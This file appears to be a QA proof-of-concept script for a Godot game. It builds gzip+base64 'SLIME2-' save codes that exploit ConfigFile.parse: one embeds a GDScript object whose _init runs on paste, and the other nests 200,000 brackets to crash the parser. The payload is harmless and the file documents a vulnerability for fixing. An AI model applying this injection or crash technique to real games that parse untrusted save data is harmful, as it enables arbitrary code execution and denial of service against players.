extends SceneTree

## QA proof of concept (not a test_*.gd suite, not run by test_all.sh). A SLIME2- save code is gzip+base64
## of a ConfigFile text, and Progress._decode_code runs ConfigFile.parse on whatever a stranger pastes:
##   mode=object : the text carries Object(Node,"script":Object(GDScript,"script/source":...)) and the
##                 script's _init() RUNS during read_code / is_old_code (arbitrary code from a pasted code).
##   mode=nest   : the text nests 200,000 '[' and the parser overflows the stack: the game process dies
##                 (SIGSEGV, exit 139) while the paste is only being checked.
## Run: ./tools/godot.sh --path . --headless -s res://tests/qa_poc_code_injection.gd -- --mode=object|nest
## Harmless payload: object mode only sets Engine meta "qa_pwned"; nothing is touched on disk.

const PROGRESS_SCRIPT := preload("res://scripts/progress.gd")


func _initialize() -> void:
	var mode := "object"
	for arg in OS.get_cmdline_user_args():
		if arg.begins_with("--mode="):
			mode = arg.get_slice("=", 1)
	var text := ""
	if mode == "nest":
		text = "[meta]\nepoch=1\n[progress]\nx=" + "[".repeat(200000) + "]".repeat(200000) + "\n"
	else:
		text = "[meta]\nepoch=1\n[progress]\nlevels_cleared=Object(Node,\"name\":\"x\",\"script\":Object(GDScript,\"script/source\":\"extends Node\\nfunc _init():\\n\\tEngine.set_meta(&'qa_pwned', true)\\n\"))\n"
	var code: String = PROGRESS_SCRIPT.SAVE_CODE_PREFIX + Marshalls.raw_to_base64(text.to_utf8_buffer().compress(FileAccess.COMPRESSION_GZIP))
	print("mode=%s code length=%d chars (prefix + base64)" % [mode, code.length()])
	print("is_old_code (runs on every paste in SETTINGS > SAVE CODE) -> ", PROGRESS_SCRIPT.is_old_code(code))
	print("read_code -> ", PROGRESS_SCRIPT.read_code(code))
	print("RESULT: %s" % ("VULNERABLE: pasted code executed script (Engine meta qa_pwned set)" if Engine.has_meta(&"qa_pwned") else "not executed"))
	quit()
